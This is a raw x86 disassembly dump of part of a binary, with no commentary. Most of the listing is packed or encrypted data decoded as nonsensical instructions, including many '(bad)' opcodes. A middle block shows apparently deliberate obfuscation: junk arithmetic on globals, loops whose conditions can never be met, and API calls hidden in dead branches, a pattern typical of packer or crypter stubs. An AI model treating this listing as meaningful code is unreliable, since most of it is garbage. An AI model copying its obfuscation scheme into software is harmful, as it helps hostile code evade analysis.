  41353b:	test   BYTE PTR [eax],0x65
  41353e:	ss sbb ah,bl
  413541:	mov    ss,esi
  413543:	and    BYTE PTR [ebx-0x24],dh
  413546:	or     DWORD PTR [ecx+eax*8],eax
  413549:	sbb    dh,BYTE PTR [esi]
  41354b:	jne    0x413584
  41354d:	xchg   DWORD PTR [ebp+0x48],esi
  413550:	mov    cs,ecx
  413552:	pop    ss
  413553:	xchg   edx,eax
  413554:	or     eax,0x1819a37b
  413559:	daa    
  41355a:	stc    
  41355b:	shl    DWORD PTR [ecx-0x2a],0xa
  41355f:	loopne 0x41357e
  413561:	in     al,0x86
  413563:	int3   
  413564:	popa   
  413565:	shl    esi,cl
  413567:	push   ecx
  413568:	pop    esi
  413569:	fldcw  WORD PTR [eax+0x72]
  41356c:	sar    DWORD PTR [edi-0x2b8ddea8],0xfe
  413573:	cdq    
  413574:	pop    esp
  413575:	sbb    BYTE PTR [edi-0x1a5603f5],al
  41357b:	les    ecx,FWORD PTR [edi+0x5ddbbef7]
  413581:	aas    
  413582:	in     al,0xeb
  413584:	jge    0x413542
  413586:	sub    al,0xf5
  413588:	or     eax,0xc90cf5bc
  41358d:	test   eax,0x5964d7b5
  413592:	and    al,0xd0
  413594:	xor    al,0x3f
  413596:	inc    esp
  413597:	(bad)  
  413598:	pop    ss
  413599:	pop    ebx
  41359a:	fcomp  QWORD PTR ds:0xea3664bc
  4135a0:	(bad)  
  4135a1:	lahf   
  4135a2:	icebp  
  4135a3:	or     ecx,0xfc95bfdf
  4135a9:	jle    0x41358f
  4135ab:	dec    esp
  4135ac:	aam    0x6d
  4135ae:	cmp    al,0xaa
  4135b0:	xchg   edx,eax
  4135b1:	out    dx,al
  4135b2:	sub    eax,esi
  4135b4:	mov    bl,0x94
  4135b6:	les    ebx,FWORD PTR [ebx-0x611b2803]
  4135bc:	hlt    
  4135bd:	cmp    esp,DWORD PTR [esi+0x47]
  4135c0:	callw  0x473e
  4135c4:	jle    0x413569
  4135c6:	dec    ecx
  4135c7:	or     al,cl
  4135c9:	adc    DWORD PTR [ebp-0x23],edi
  4135cc:	adc    edi,DWORD PTR ds:0xf186c243
  4135d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4135d3:	sti    
  4135d4:	pusha  
  4135d5:	(bad)  
  4135d6:	shl    cl,cl
  4135d8:	retf   
  4135d9:	daa    
  4135da:	ins    BYTE PTR es:[edi],dx
  4135db:	sub    DWORD PTR [ebx-0x4e83cdf5],ecx
  4135e1:	dec    ebp
  4135e2:	push   ebp
  4135e3:	and    dl,BYTE PTR [eax]
  4135e5:	pop    eax
  4135e6:	lds    esp,FWORD PTR [ecx-0x21]
  4135e9:	cmp    ah,BYTE PTR [edx-0x1d]
  4135ec:	clc    
  4135ed:	aaa    
  4135ee:	mul    dh
  4135f0:	enter  0xcab9,0x5e
  4135f4:	out    dx,eax
  4135f5:	dec    esp
  4135f6:	pop    ecx
  4135f7:	push   esp
  4135f8:	clc    
  4135f9:	les    ebp,FWORD PTR [eax+ebx*1+0x41]
  4135fd:	xor    al,BYTE PTR [edx-0x768bb9f0]
  413603:	stos   BYTE PTR es:[edi],al
  413604:	adc    dl,dl
  413606:	add    BYTE PTR [esi+0x41d27bbd],bl
  41360c:	nop
  41360d:	push   ebx
  41360e:	sub    BYTE PTR [edx],0x15
  413611:	inc    esp
  413612:	mov    eax,0x3f4d193e
  413617:	jg     0x4135ee
  413619:	loope  0x4135b5
  41361b:	adc    ebx,DWORD PTR [edx]
  41361d:	or     al,0x58
  41361f:	and    ecx,DWORD PTR [ebx]
  413621:	push   edi
  413622:	xchg   ebp,eax
  413623:	in     eax,0xf3
  413625:	in     eax,0xb3
  413627:	int    0x68
  413629:	push   cs
  41362a:	fidiv  WORD PTR [edi+0x12]
  41362d:	inc    ecx
  41362e:	add    eax,0xd2b8b72a
  413633:	push   0x39
  413635:	sub    al,0xd1
  413637:	jnp    0x41362a
  413639:	xchg   edi,eax
  41363a:	xchg   ecx,eax
  41363b:	add    edx,ebp
  41363d:	push   0xec6a0500
  413642:	jge    0x41366e
  413644:	lods   al,BYTE PTR ds:[esi]
  413645:	lahf   
  413646:	cmp    BYTE PTR [edx],bl
  413648:	mov    cl,0x8a
  41364a:	pop    esi
  41364b:	pop    ss
  41364c:	(bad)  
  41364d:	(bad)  
  41364e:	js     0x41367e
  413650:	xor    al,0x1f
  413652:	(bad)  
  413653:	ficomp WORD PTR ds:0x772cbc8b
  413659:	imul   eax,edx,0x2
  41365c:	sub    bh,BYTE PTR [ebx]
  41365e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41365f:	aam    0x4d
  413661:	or     al,0x1c
  413663:	(bad)
  413666:	pop    ebp
  413667:	xor    ecx,DWORD PTR [ecx-0x5e]
  41366a:	mov    al,ss:0x5389fa35
  413670:	(bad)  
  413671:	stc    
  413672:	jns    0x4135fa
  413674:	jecxz  0x4136d0
  413676:	call   0xd73d21fa
  41367b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41367c:	fs pop ebp
  41367e:	ret    0x92c
  413681:	ins    BYTE PTR es:[edi],dx
  413682:	loope  0x413672
  413684:	in     eax,dx
  413685:	mov    ah,0x8a
  413687:	pop    esp
  413688:	jl     0x413669
  41368a:	inc    DWORD PTR [ebx+0x2490c52d]
  413690:	fwait
  413691:	jle    0x4136b5
  413693:	xchg   edi,eax
  413694:	push   0x677687d3
  413699:	jge    0x4136d2
  41369b:	sub    edi,DWORD PTR [ebx-0x1d]
  41369e:	jbe    0x413686
  4136a0:	in     al,0x1
  4136a2:	sti    
  4136a3:	or     al,0xd0
  4136a5:	mov    edi,edx
  4136a7:	pop    es
  4136a8:	stos   DWORD PTR es:[edi],eax
  4136a9:	mov    eax,0x57ba0321
  4136ae:	(bad)
  4136b2:	pushf  
  4136b3:	stc    
  4136b4:	test   BYTE PTR [eax+0x3d],cl
  4136b7:	xchg   edi,eax
  4136b8:	mov    eax,0x7e44064c
  4136bd:	call   0xf503:0x8d638eda
  4136c4:	mov    ?,WORD PTR [edx+0x51c7d183]
  4136ca:	lods   al,BYTE PTR ds:[esi]
  4136cb:	or     eax,0x213ff1ee
  4136d0:	loop   0x413693
  4136d2:	cmp    DWORD PTR [eax-0x32],esi
  4136d5:	lea    ebx,[edi-0x5bc10463]
  4136db:	ror    BYTE PTR [ecx-0x1a],0xf
  4136df:	ins    DWORD PTR es:[edi],dx
  4136e0:	addr16 mov esp,0x91a6b573
  4136e6:	aad    0xcc
  4136e8:	inc    esp
  4136e9:	and    al,0xd9
  4136eb:	xor    DWORD PTR [edi+eiz*1],ecx
  4136ee:	xchg   ecx,eax
  4136ef:	fisub  DWORD PTR [edi+0x2f]
  4136f2:	ins    DWORD PTR es:[edi],dx
  4136f3:	(bad)  
  4136f4:	sti    
  4136f5:	adc    edx,DWORD PTR [ecx]
  4136f7:	jmp    FWORD PTR [esi-0x24e8e671]
  4136fd:	dec    esp
  4136fe:	int    0x82
  413700:	xchg   esp,eax
  413701:	mov    dl,BYTE PTR [edi-0x13]
  413704:	pop    eax
  413705:	inc    edx
  413706:	hlt    
  413707:	scas   al,BYTE PTR es:[edi]
  413708:	std    
  413709:	loope  0x4136fc
  41370b:	ja     0x413693
  41370d:	push   esi
  41370e:	sbb    DWORD PTR [edi],ecx
  413710:	adc    al,0xd8
  413712:	leave  
  413713:	mov    al,ds:0xc2d29e94
  413718:	mov    ch,0xc5
  41371a:	and    eax,0xcb878461
  41371f:	aas    
  413720:	and    eax,0x48f0606
  413725:	add    al,0xc0
  413727:	pop    ss
  413728:	add    ebx,DWORD PTR [edi]
  41372a:	je     0x4137ab
  41372c:	ret    0xf4b8
  41372f:	imul   ecx,DWORD PTR [edx],0x44
  413732:	sahf   
  413733:	sbb    al,BYTE PTR [edx+0x2773f0f0]
  413739:	or     ecx,edx
  41373b:	js     0x41374a
  41373d:	sub    eax,0xbc802fad
  413742:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413743:	das    
  413744:	or     ebx,eax
  413746:	adc    DWORD PTR [esi-0x21],ebx
  413749:	cmp    ch,BYTE PTR [esp+ecx*8+0x3ef3192a]
  413750:	push   edi
  413751:	fst    QWORD PTR ss:[esi]
  413754:	(bad)  [ecx]
  413756:	js     0x4137b2
  413758:	fs pop esp
  41375a:	xchg   ebp,eax
  41375b:	jb     0x413755
  41375d:	repz mov es:0xdaaf2873,al
  413764:	add    ebx,ebp
  413766:	push   cs
  413767:	hlt    
  413768:	ror    DWORD PTR [esi-0x40f91ab3],cl
  41376e:	(bad)  
  41376f:	sbb    al,0x7
  413771:	das    
  413772:	frstor [edx]
  413774:	icebp  
  413775:	sub    al,0x93
  413777:	out    0x30,eax
  413779:	retf   0x16ef
  41377c:	aas    
  41377d:	mov    esp,0xe4b57cfe
  413782:	mov    edi,0xcee574d9
  413787:	lahf   
  413788:	inc    edx
  413789:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41378a:	es mov bl,al
  41378d:	jmp    0x41372d
  41378f:	lahf   
  413790:	lahf   
  413791:	cs mov ebp,0x6b70265a
  413797:	retf   
  413798:	ins    DWORD PTR es:[edi],dx
  413799:	mov    dl,BYTE PTR [ecx]
  41379b:	add    bh,BYTE PTR [esi+0x4c10a512]
  4137a1:	aas    
  4137a2:	(bad)  
  4137a4:	jbe    0x413794
  4137a6:	mov    bh,ch
  4137a8:	add    esi,DWORD PTR [eax+0x59f1ccb1]
  4137ae:	icebp  
  4137af:	std    
  4137b0:	repnz inc ebx
  4137b2:	(bad)
  4137b5:	aas    
  4137b6:	or     esi,edi
  4137b8:	push   eax
  4137b9:	scas   al,BYTE PTR es:[edi]
  4137ba:	js     0x4137e7
  4137bc:	imul   edx,ebx,0x70f79676
  4137c2:	cmp    dl,BYTE PTR [esi]
  4137c4:	jmp    0xeb247e42
  4137c9:	jbe    0x41384a
  4137cb:	call   0xaa398430
  4137d0:	jno    0x41378d
  4137d2:	stos   DWORD PTR es:[edi],eax
  4137d3:	pop    ecx
  4137d4:	out    0x0,al
  4137d6:	push   ss
  4137d7:	jp     0x413854
  4137d9:	mov    ds:0x8ec579d5,al
  4137de:	pop    edx
  4137df:	aaa    
  4137e0:	adc    cl,BYTE PTR [edi-0x66]
  4137e3:	xlat   BYTE PTR ds:[ebx]
  4137e4:	push   ebp
  4137e5:	mov    ah,0xaa
  4137e7:	(bad)  
  4137e8:	hlt    
  4137e9:	add    ebx,eax
  4137eb:	sbb    dl,BYTE PTR [edi]
  4137ed:	loopne 0x41381a
  4137ef:	and    BYTE PTR [eax-0x3ceb34a9],0xf3
  4137f6:	jp     0x4137d7
  4137f8:	mov    ebp,DWORD PTR [esi-0x20]
  4137fb:	add    esi,esi
  4137fd:	daa    
  4137fe:	js     0x41379b
  413800:	or     eax,0x8a64ee45
  413805:	aaa    
  413806:	adc    al,0xcf
  413808:	ds pcmpeqd mm7,mm4
  41380c:	loop   0x4137f3
  41380e:	push   cs
  41380f:	pop    ss
  413810:	add    al,0xe5
  413812:	mov    dl,bl
  413814:	jbe    0x413895
  413816:	xor    DWORD PTR [ebp+0x77],edi
  413819:	cmp    edx,eax
  41381b:	xor    esp,DWORD PTR [eax+0x66]
  41381e:	inc    ecx
  41381f:	sbb    al,0x6e
  413821:	inc    esi
  413822:	xor    esi,DWORD PTR [edx]
  413824:	push   ecx
  413825:	xchg   edx,eax
  413826:	inc    ebx
  413827:	pop    eax
  413828:	push   DWORD PTR es:[edi+0x1e2e6d30]
  41382f:	aad    0xa
  413831:	loopne 0x4138a9
  413833:	mov    WORD PTR [edi-0x3c],es
  413836:	pop    eax
  413837:	pop    es
  413838:	pop    es
  413839:	jae    0x4137eb
  41383b:	dec    ebp
  41383c:	push   eax
  41383d:	and    edx,DWORD PTR [eax]
  41383f:	mov    ds:0x6a9b4dfd,al
  413844:	rcr    BYTE PTR [edx+0xf],0x87
  413848:	data16 xor BYTE PTR [ecx+0x73],al
  41384c:	out    dx,eax
  41384d:	dec    ecx
  41384e:	add    ebp,DWORD PTR [eax+0x2d7cd0b]
  413854:	data16 stc 
  413856:	pop    edi
  413857:	ins    DWORD PTR es:[edi],dx
  413858:	stc    
  413859:	les    ebx,FWORD PTR [ebp+0x5ecda24d]
  41385f:	mov    eax,DWORD PTR fs:[edi]
  413862:	shl    DWORD PTR [ebx-0x6f5d720],cl
  413868:	mov    dh,0xee
  41386a:	sbb    eax,0x5393ba39
  41386f:	test   al,0x78
  413871:	inc    eax
  413872:	fdivr  st(1),st
  413874:	sub    DWORD PTR [edx],edx
  413876:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413877:	mov    dh,0x52
  413879:	ror    BYTE PTR ds:0xad70343,cl
  41387f:	mov    WORD PTR [edx-0x31],ds
  413882:	(bad)  
  413883:	popa   
  413884:	sub    eax,0x5999cd74
  413889:	stos   DWORD PTR es:[edi],eax
  41388a:	aas    
  41388b:	mov    gs,ebx
  41388d:	xor    eax,0x88a15cb9
  413892:	sbb    eax,0xef9938f6
  413897:	add    eax,0x1c27aff6
  41389c:	loop   0x41386f
  41389e:	xchg   BYTE PTR [edi],bl
  4138a0:	pop    ebp
  4138a1:	jno    0x4138a7
  4138a3:	cdq    
  4138a4:	icebp  
  4138a5:	sbb    BYTE PTR [ebx],dh
  4138a7:	mov    ebp,DWORD PTR [ecx+ebx*8-0x705440f6]
  4138ae:	ins    DWORD PTR es:[edi],dx
  4138af:	(bad)  
  4138b0:	out    dx,al
  4138b1:	aad    0xb5
  4138b3:	mov    al,ds:0xd114b1d5
  4138b8:	(bad)  
  4138b9:	inc    ebx
  4138ba:	jecxz  0x4138d5
  4138bc:	fistp  WORD PTR [eax]
  4138be:	vmaxpd xmm0,xmm6,XMMWORD PTR [edx+0x2e29394e]
  4138c6:	xor    edi,DWORD PTR [eax+edx*4]
  4138c9:	(bad)  
  4138ca:	sbb    DWORD PTR [ebx*2-0x4357f419],esp
  4138d1:	pop    edi
  4138d2:	jmp    0xd7c2e192
  4138d7:	mov    edi,0x2da71edd
  4138dc:	push   ebx
  4138dd:	mov    dl,0x4f
  4138df:	enter  0xaacf,0xb
  4138e3:	xor    ebx,eax
  4138e5:	and    DWORD PTR ds:0x42b01c,0x4e66
  4138ef:	sub    edx,ebx
  4138f1:	sub    edx,esi
  4138f3:	adc    DWORD PTR ds:0x42c014,0x3307
  4138fd:	xor    edx,eax
  4138ff:	add    DWORD PTR ds:0x42d004,0x3241
  413909:	mov    DWORD PTR [ebp+0x8],edx
  41390c:	or     ebx,ebx
  41390e:	mov    edx,DWORD PTR [ebp+0x8]
  413911:	mov    ebx,DWORD PTR [ebp-0x58]
  413914:	sub    DWORD PTR ds:0x429004,0x42c00c
  41391e:	add    edx,0x5708c4
  413924:	imul   edx,ebx
  413927:	mov    DWORD PTR [ebp-0x58],edx
  41392a:	mov    edx,DWORD PTR [ebp+0x8]
  41392d:	and    DWORD PTR ds:0x42d01c,0x0
  413937:	mov    ebx,DWORD PTR ds:0x42d01c
  41393d:	inc    ebx
  41393e:	mov    DWORD PTR ds:0x42d01c,ebx
  413944:	cmp    DWORD PTR ds:0x42d01c,0x29
  41394b:	jne    0x41395a
  413951:	push   DWORD PTR [ebp-0x24]
  413954:	call   DWORD PTR ds:0x42e913
  41395a:	cmp    DWORD PTR ds:0x42d01c,0x1e
  413961:	jb     0x413937
  413967:	and    DWORD PTR ds:0x42d004,0x0
  413971:	mov    ebx,DWORD PTR ds:0x42d004
  413977:	inc    ebx
  413978:	mov    DWORD PTR ds:0x42d004,ebx
  41397e:	cmp    DWORD PTR ds:0x42d004,0x7
  413985:	jne    0x4139a0
  41398b:	push   0x1baa
  413990:	push   0x42e075
  413995:	push   0x429010
  41399a:	call   DWORD PTR ds:0x42e917
  4139a0:	cmp    DWORD PTR ds:0x42d004,0x6
  4139a7:	jne    0x4139ba
  4139ad:	mov    ebx,DWORD PTR ds:0x42d004
  4139b3:	inc    ebx
  4139b4:	mov    DWORD PTR ds:0x42d004,ebx
  4139ba:	cmp    DWORD PTR ds:0x42d004,0x14
  4139c1:	jb     0x413971
  4139c7:	add    DWORD PTR ds:0x42d000,edx
  4139cd:	mov    ebx,DWORD PTR [ebp-0x54]
  4139d0:	mov    DWORD PTR ds:0x42b008,0x4ad3
  4139da:	add    edx,0x64f8da
  4139e0:	or     edx,ebx
  4139e2:	add    DWORD PTR ds:0x42c008,0x5d21
  4139ec:	mov    DWORD PTR [ebp-0x54],edx
  4139ef:	mov    edx,DWORD PTR [ebp+0x8]
  4139f2:	mov    ebx,DWORD PTR [ebp-0x50]
  4139f5:	and    DWORD PTR ds:0x42b008,0x3404
  4139ff:	add    edx,ecx
  413a01:	xor    DWORD PTR ds:0x42a000,0x42d000
  413a0b:	xor    edx,ebx
  413a0d:	mov    DWORD PTR [ebp-0x50],edx
  413a10:	add    ebx,edx
  413a12:	mov    edx,DWORD PTR [ebp+0x8]
  413a15:	adc    DWORD PTR ds:0x429008,edx
  413a1b:	mov    ebx,DWORD PTR [ebp-0x4c]
  413a1e:	or     DWORD PTR ds:0x429028,0x42d010
  413a28:	add    edx,edi
  413a2a:	or     DWORD PTR ds:0x429008,0x429010
  413a34:	and    edx,ebx
  413a36:	xor    DWORD PTR ds:0x429028,ecx
  413a3c:	mov    DWORD PTR [ebp-0x4c],edx
  413a3f:	mov    DWORD PTR ds:0x42c004,0x18
  413a49:	cmp    DWORD PTR ds:0x42c004,0x0
  413a50:	je     0x413a93
  413a56:	cmp    DWORD PTR ds:0x42c004,0x1e
  413a5d:	jne    0x413a7b
  413a63:	push   0x42a004
  413a68:	push   0x2285
  413a6d:	push   DWORD PTR [ebp-0x24]
  413a70:	push   0x1fc0
  413a75:	call   DWORD PTR ds:0x42e8cf
  413a7b:	mov    ebx,DWORD PTR ds:0x42c004
  413a81:	dec    ebx
  413a82:	mov    DWORD PTR ds:0x42c004,ebx
  413a88:	jmp    0x413a49
  413a8d:	add    DWORD PTR ds:0x42d00c,ecx
  413a93:	mov    edx,DWORD PTR [ebp+0x8]
  413a96:	sbb    ebx,DWORD PTR ds:0x42a00c
  413a9c:	mov    ebx,DWORD PTR [ebp-0x48]
  413a9f:	lea    edx,[ebx+edx*1+0x241fc1f]
  413aa6:	mov    DWORD PTR [ebp-0x48],edx
  413aa9:	inc    edx
  413aaa:	mov    edx,DWORD PTR [ebp+0x8]
  413aad:	movzx  ebx,BYTE PTR ds:0x429000
  413ab4:	sbb    DWORD PTR ds:0x42c018,ebx
  413aba:	mov    ebx,0xfa5e15e2
  413abf:	sub    ebx,edx
  413ac1:	add    ebx,DWORD PTR [ebp-0x44]
  413ac4:	and    DWORD PTR ds:0x42c018,0x0
  413ace:	jmp    0x413ae0
  413ad3:	mov    edx,DWORD PTR ds:0x42c018
  413ad9:	inc    edx
  413ada:	mov    DWORD PTR ds:0x42c018,edx
  413ae0:	cmp    DWORD PTR ds:0x42c018,0x15
  413ae7:	jae    0x413b1a
  413aed:	cmp    DWORD PTR ds:0x42c018,0x18
  413af4:	jne    0x413b0f
  413afa:	push   0x88b0
  413aff:	push   0x8c9b
  413b04:	push   0x27a5
  413b09:	call   DWORD PTR ds:0x42e8d3
  413b0f:	jmp    0x413ad3
  413b14:	or     DWORD PTR ds:0x42b004,edx
  413b1a:	mov    DWORD PTR [ebp-0x44],ebx
  413b1d:	mov    DWORD PTR ds:0x42d00c,0x11
  413b27:	cmp    DWORD PTR ds:0x42d00c,0x0
  413b2e:	je     0x413b75
  413b34:	cmp    DWORD PTR ds:0x42d00c,0x1d
  413b3b:	jne    0x413b59
  413b41:	push   0x88e0
  413b46:	push   DWORD PTR [ebp-0x18]
  413b49:	push   0x3079
  413b4e:	push   0x26f3
  413b53:	call   DWORD PTR ds:0x42e8d7
  413b59:	mov    edx,DWORD PTR ds:0x42d00c
  413b5f:	dec    edx
  413b60:	mov    DWORD PTR ds:0x42d00c,edx
  413b66:	jmp    0x413b27
  413b6b:	add    DWORD PTR ds:0x42a014,0x1458
  413b75:	mov    edx,DWORD PTR [ebp+0x8]
  413b78:	xor    DWORD PTR ds:0x429008,0x1867
  413b82:	xor    edx,eax
  413b84:	mov    DWORD PTR ds:0x42900c,0x6609
  413b8e:	add    edx,esi
  413b90:	mov    DWORD PTR ds:0x42d008,0x7de
  413b9a:	jne    0x41157e
  413ba0:	mov    DWORD PTR ds:0x42a008,0x2294
  413baa:	jmp    0x41cc2e
  413baf:	xor    edx,edx
  413bb1:	add    edx,DWORD PTR ds:0x42d014
  413bb7:	sbb    DWORD PTR ds:0x429008,edx
  413bbd:	mov    edx,DWORD PTR [ebp-0xc]
  413bc0:	mov    DWORD PTR ds:0x429010,0x17
  413bca:	cmp    DWORD PTR ds:0x429010,0x0
  413bd1:	je     0x413c04
  413bd7:	cmp    DWORD PTR ds:0x429010,0x18
  413bde:	jne    0x413bea
  413be4:	call   DWORD PTR ds:0x42e91b
  413bea:	xor    ebx,ebx
  413bec:	add    ebx,DWORD PTR ds:0x429010
  413bf2:	dec    ebx
  413bf3:	mov    DWORD PTR ds:0x429010,ebx
  413bf9:	jmp    0x413bca
  413bfe:	or     DWORD PTR ds:0x42c014,ebx
  413c04:	sub    edx,esi
  413c06:	xor    edx,eax
  413c08:	mov    ebx,DWORD PTR ds:0x41cdd0
  413c0e:	mov    ebx,DWORD PTR [ebx]
  413c10:	sub    DWORD PTR ds:0x42b018,ebx
  413c16:	mov    DWORD PTR [ebp-0x5c],edx
  413c19:	and    DWORD PTR ds:0x42b004,0x0
  413c23:	jmp    0x413c35
  413c28:	mov    ebx,DWORD PTR ds:0x42b004
  413c2e:	inc    ebx
  413c2f:	mov    DWORD PTR ds:0x42b004,ebx
  413c35:	cmp    DWORD PTR ds:0x42b004,0x1c
  413c3c:	jae    0x413c60
  413c42:	cmp    DWORD PTR ds:0x42b004,0x24
  413c49:	jne    0x413c5b
  413c4f:	push   DWORD PTR [ebp-0x1c]
  413c52:	push   DWORD PTR [ebp-0x10]
  413c55:	call   DWORD PTR ds:0x42e91f
  413c5b:	jmp    0x413c28
  413c60:	mov    edx,DWORD PTR [ebp-0x10]
  413c63:	mov    ebx,DWORD PTR [ebp-0x8]
  413c66:	xor    edx,eax
  413c68:	xor    ebx,eax
  413c6a:	sub    edx,ebx
  413c6c:	sub    edx,esi
  413c6e:	xor    edx,eax
  413c70:	mov    DWORD PTR [ebp-0x10],edx
  413c73:	mov    edx,DWORD PTR [ebp-0x14]
  413c76:	mov    DWORD PTR [ebp+0x8],edx
  413c79:	jmp    0x416037
  413c7e:	mov    edx,DWORD PTR [ebp+0x8]
  413c81:	mov    ebx,DWORD PTR [ebp-0x8]
  413c84:	xor    edx,eax
  413c86:	xor    ebx,eax
  413c88:	sub    edx,ebx
  413c8a:	sub    edx,esi
  413c8c:	xor    edx,eax
  413c8e:	mov    DWORD PTR [ebp+0x8],edx
  413c91:	mov    edx,DWORD PTR [ebp+0x8]
  413c94:	mov    ebx,DWORD PTR [ebp-0x58]
  413c97:	add    edx,0x5708c4
  413c9d:	imul   edx,ebx
  413ca0:	mov    DWORD PTR [ebp-0x58],edx
  413ca3:	mov    edx,DWORD PTR [ebp+0x8]
  413ca6:	mov    ebx,DWORD PTR [ebp-0x54]
  413ca9:	add    edx,0x64f8da
  413caf:	or     edx,ebx
  413cb1:	mov    DWORD PTR [ebp-0x54],edx
  413cb4:	mov    edx,DWORD PTR [ebp+0x8]
  413cb7:	mov    ebx,DWORD PTR [ebp-0x50]
  413cba:	add    edx,ecx
  413cbc:	jmp    0x416005
  413cc1:	xchg   ecx,eax
  413cc2:	mov    bh,BYTE PTR [edx]
  413cc4:	aad    0x3
  413cc6:	mov    ch,0x93
  413cc8:	mov    ah,al
  413cca:	xor    ebx,ecx
  413ccc:	ja     0x413d19
  413cce:	call   0x8a555156
  413cd3:	jl     0x413d51
  413cd5:	inc    eax
  413cd6:	pop    edi
  413cd7:	jl     0x413d55
  413cd9:	jmp    0x7ee5:0x82df9a32
  413ce0:	pop    ds
  413ce1:	xchg   ebx,eax
  413ce2:	lods   eax,DWORD PTR ds:[esi]
  413ce3:	cmp    eax,0xee35a436
  413ce8:	fisubr WORD PTR ds:0x411b86da
  413cee:	push   ss
  413cef:	inc    eax
  413cf0:	sub    edi,esi
  413cf2:	mov    bl,0x2e
  413cf4:	or     cl,BYTE PTR [esi-0x22c4f2dd]
  413cfa:	in     eax,dx
  413cfb:	lahf   
  413cfc:	dec    eax
  413cfd:	sbb    eax,0xc2298a01
  413d02:	add    eax,0xce2bbc84
  413d07:	mov    ebx,0x2a952ed0
  413d0c:	cmc    
  413d0d:	mov    al,dh
  413d0f:	dec    ebx
  413d10:	jle    0x413d1b
  413d12:	sub    esi,eax
  413d14:	fmul   st,st(5)
  413d16:	into   
  413d17:	in     eax,0x4a
  413d19:	push   edi
  413d1a:	lock jge 0x413cac
  413d1d:	xchg   ebx,eax
  413d1e:	xchg   esi,eax
  413d1f:	jmp    DWORD PTR [eax]
  413d21:	dec    ebp
  413d22:	in     al,0x8e
  413d24:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413d25:	sbb    eax,0x8c1f1033
  413d2a:	arpl   di,si
  413d2c:	mov    ecx,0xd619cd89
  413d31:	outs   dx,BYTE PTR ds:[esi]
  413d32:	xchg   DWORD PTR [esi],esp
  413d34:	imul   esp,DWORD PTR [edx+0x4926ad22],0xffffffd7
  413d3b:	pop    ebp
  413d3c:	(bad)  
  413d3e:	cmp    DWORD PTR [ecx],0xffffff87
  413d41:	cmp    DWORD PTR [edi+0x4],eax
  413d44:	shl    BYTE PTR [edx],0xe0
  413d47:	retf   
  413d48:	jno    0x413daf
  413d4a:	jl     0x413d11
  413d4c:	test   eax,0xb905fe55
  413d51:	mov    ecx,0x9e0bff0d
  413d56:	jmp    0x413ced
  413d58:	std    
  413d59:	push   esi
  413d5a:	pop    ebx
  413d5b:	mov    bh,0x82
  413d5d:	js     0x413d1b
  413d5f:	jle    0x413d82
  413d61:	xor    BYTE PTR [esi-0xf7f3a91],ah
  413d67:	leave  
  413d68:	cmp    DWORD PTR [esi-0x5996e3d1],ebx
  413d6e:	mov    eax,ebp
  413d70:	sbb    al,BYTE PTR [ebx]
  413d72:	sub    ch,BYTE PTR [ebp+eiz*4+0x19147188]
  413d79:	jmp    0x1826456a
  413d7e:	test   DWORD PTR [esi-0x70],esi
  413d81:	ins    BYTE PTR es:[edi],dx
  413d82:	clc    
  413d83:	inc    ecx
  413d84:	mov    ds:0x6490a678,eax
  413d89:	leave  
  413d8a:	pop    edx
  413d8b:	jle    0x413e06
  413d8d:	cmp    eax,0x44
  413d90:	iret   
  413d91:	sbb    DWORD PTR [edi+ebx*4+0x49677661],eax
  413d98:	mov    al,ds:0xbecf2856
  413d9d:	push   0xffffffdb
  413d9f:	dec    ebp
  413da0:	inc    edx
  413da1:	stc    
  413da2:	dec    ebp
  413da3:	int3   
  413da4:	push   es
  413da5:	adc    al,0xfc
  413da7:	stc    
  413da8:	xor    cl,BYTE PTR [ebx-0x16]
  413dab:	cmp    eax,0x317d26fe
  413db0:	mov    al,ds:0x65294de5
  413db5:	rcl    BYTE PTR [esi+0x37b31c1e],1
  413dbb:	adc    BYTE PTR [ebx+0x7f],bl
  413dbe:	adc    eax,edx
  413dc0:	xchg   esp,eax
  413dc1:	jnp    0x413d54
  413dc3:	out    dx,al
  413dc4:	xchg   esp,eax
  413dc5:	je     0x413d6a
  413dc7:	or     dl,BYTE PTR [edi]
  413dc9:	xor    BYTE PTR [eax+0x20],dl
  413dcc:	dec    edx
  413dcd:	or     ebx,DWORD PTR [eax+eax*4]
  413dd0:	aam    0x7e
  413dd2:	jns    0x413df3
  413dd4:	leave  
  413dd5:	ret    0xe2d8
  413dd8:	hlt    
  413dd9:	add    eax,0x5513b927
  413dde:	xchg   esi,eax
  413ddf:	jmp    0x85d0d809
  413de4:	in     eax,0x9b
  413de6:	es int 0x9
  413de9:	js     0x413df1
  413deb:	cmp    al,0xd9
  413ded:	dec    edx
  413dee:	sahf   
  413def:	leave  
  413df0:	push   ebp
  413df1:	and    al,0xf
  413df3:	dec    eax
  413df4:	jbe    0x413e11
  413df6:	loop   0x413df8
  413df8:	jnp    0x413dba
  413dfa:	(bad)
  413dff:	loope  0x413dac
  413e01:	cld    
  413e02:	mov    edx,0x83f1b5a6
  413e07:	stc    
  413e08:	lods   eax,DWORD PTR ds:[esi]
  413e09:	cmp    DWORD PTR [esp+eax*1-0x3b],esi
  413e0d:	repz int3 
  413e0f:	mov    DWORD PTR [ebx-0x7a],0x12a0ca9d
  413e16:	loope  0x413dc6
  413e18:	iret   
  413e19:	sti    
  413e1a:	imul   edi,DWORD PTR [eax],0xf7c261e
  413e20:	in     al,dx
  413e21:	adc    cl,dh
  413e23:	cmc    
  413e24:	jbe    0x413dd5
  413e26:	jbe    0x413de5
  413e28:	iret   
  413e29:	and    ah,al
  413e2b:	mov    dh,0x33
  413e2d:	sbb    al,0xef
  413e2f:	ja     0x413e58
  413e31:	push   edx
  413e32:	loop   0x413e90
  413e34:	xchg   edi,eax
  413e35:	in     al,0x9e
  413e37:	xor    BYTE PTR [ecx+0x52],0x71
  413e3b:	jp     0x413ddf
  413e3d:	iret   
  413e3e:	mov    bl,0x97
  413e40:	idiv   BYTE PTR [esp+ebx*1-0x47]
  413e44:	adc    DWORD PTR [eax+edi*2],esp
  413e47:	mov    ebp,0x7cc7e193
  413e4c:	xchg   esp,eax
  413e4d:	loope  0x413e84
  413e4f:	cmc    
  413e50:	push   es
  413e51:	pop    edi
  413e52:	xchg   ebx,eax
  413e53:	sbb    dh,ah
  413e55:	ret    
  413e56:	stos   BYTE PTR es:[edi],al
